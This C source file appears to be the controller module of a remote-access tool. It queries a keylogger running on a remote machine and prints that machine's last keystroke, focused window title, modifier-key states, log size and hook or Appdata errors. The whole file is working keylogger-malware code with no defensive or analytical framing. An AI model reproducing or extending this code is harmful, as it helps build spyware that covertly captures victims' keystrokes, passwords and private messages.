#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include "server/serv_cmds.h"
#include "net/interface.h"
#include "net/error.h"
#include "logger.h"
#include "types.h"
#include "keylogger.h"

#define KEYLOGGER_NO_ERROR 0x0
#define KEYLOGGER_ERROR_CREATE_FILE 0x1
#define KEYLOGGER_ERROR_GET_APPDATA 0x2
#define KEYLOGGER_ERROR_CREATE_THREAD 0x3
#define KEYLOGGER_ERROR_SET_HOOK 0x4
#define KEYLOGGER_ERROR_FOCUS_TITLE 0x5

#define SERV_KEYLOGGER_INFO_TYPE_GB 1
#define SERV_KEYLOGGER_INFO_TYPE_MB 2
#define SERV_KEYLOGGER_INFO_TYPE_KB 3
#define SERV_KEYLOGGER_INFO_TYPE_B 0

typedef struct __serv_keylogger_info
{
	uint8 isRunning;
	uint8 specKey;
	uint16 lastKey;
	uint32 lastError;
	long lastTime;
	uint8 lastFocusTitle[0xFF];
	double size;
	char sizeType;
}SERV_KEYLOGGER_INFO;

char* serv_KEYLOGGER_INFO_translateError(int code)
{
	switch(code)
	{
		case KEYLOGGER_NO_ERROR:
			return "No error";
		case KEYLOGGER_ERROR_CREATE_FILE:
			return "Failed to create a file";
		case KEYLOGGER_ERROR_GET_APPDATA:
			return "Couldn't open Appdata";
		case KEYLOGGER_ERROR_CREATE_THREAD:
			return "Create thread";
		case KEYLOGGER_ERROR_SET_HOOK:
			return "Set hook";
		case KEYLOGGER_ERROR_FOCUS_TITLE:
			return "Get focus data";
		default:
			return "Error not supported";
	}
}

int serv_KEYLOGGER_INFO(void)
{
	if(net_SendEmptyCmd(SERV_CMDS_KEYLOGGER_INFO) < 1)
	{
		net_PrintLastError();

		return SERV_CMDS_BREAK;
	}

	net_SetBuffer(NET_DATA_BUFFSIZE);

	uint8* rmsg;

	if(net_ReceiveDataTimeout(&rmsg, NET_RECV_TRIES) < 1)
	{
		net_PrintLastError();
		net_SetBuffer(NET_BUFFSIZE);

		return SERV_CMDS_BREAK;
	}

	SERV_KEYLOGGER_INFO klInfo;// = malloc(sizeof(SERV_KEYLOGGER_INFO));
	memcpy(&klInfo, rmsg, sizeof(SERV_KEYLOGGER_INFO));
	free(rmsg);

	net_SetBuffer(NET_BUFFSIZE);

	LOG(LOG_TABLE, "Is active: %d\n", klInfo.isRunning);
	LOG(LOG_TABLE, "Last error: %s\n", serv_KEYLOGGER_INFO_translateError(klInfo.lastError));
	LOG(LOG_TABLE, "Last time key pressed: %s", ctime(&klInfo.lastTime));

	char shelp = 0x0;

	if(klInfo.sizeType == SERV_KEYLOGGER_INFO_TYPE_GB)
	{
		shelp = 'G';
	}else if(klInfo.sizeType == SERV_KEYLOGGER_INFO_TYPE_MB){
		shelp = 'M';
	}else if(klInfo.sizeType == SERV_KEYLOGGER_INFO_TYPE_KB){
		shelp = 'K';
	}else if(klInfo.sizeType == SERV_KEYLOGGER_INFO_TYPE_B){
		shelp = '\b';
	}

	LOG(LOG_TABLE, "Size: %.2f %cB\n", klInfo.size, shelp);

	int klinfo_ft_helper = strlen((char*)klInfo.lastFocusTitle);
	if(klInfo.lastFocusTitle[klinfo_ft_helper - 1] == '\n')
	{
		klInfo.lastFocusTitle[klinfo_ft_helper - 1] = 0x0;
	}

	LOG(LOG_TABLE, "Focus window: %s\n", klInfo.lastFocusTitle);
	LOG(LOG_TABLE, "Last key: ");

	char lkeyBuff[0x10];
	memset(lkeyBuff, 0, 0x10);

	int lkeyRv = keylogger_DecodeKey(klInfo.lastKey, lkeyBuff, 0x10);

	if(!lkeyRv)
	{
		puts("Empty");
	}else{
		if(KEYLOGGER_IS_CTRL_ON(lkeyRv))
		{
			printf("Ctrl + %s\n", lkeyBuff);
		}else{
			puts(lkeyBuff);
		}
	}

	LOG(LOG_TABLE, "Ctrl: ");

	if((klInfo.specKey >> KEYLOGGER_TABLE_CTRL) & 0x1)
	{
		puts("On");
	}else{
		puts("Off");
	}

	LOG(LOG_TABLE, "Shift: ");
	
	if((klInfo.specKey >> KEYLOGGER_TABLE_SHIFT) & 0x1)
	{
		puts("On");
	}else{
		puts("Off");
	}

	LOG(LOG_TABLE, "Caps lock: ");
	
	if((klInfo.specKey >> KEYLOGGER_TABLE_CAPS_LOCK) & 0x1)
	{
		puts("On");
	}else{
		puts("Off");
	}

	return SERV_CMDS_GOOD;
}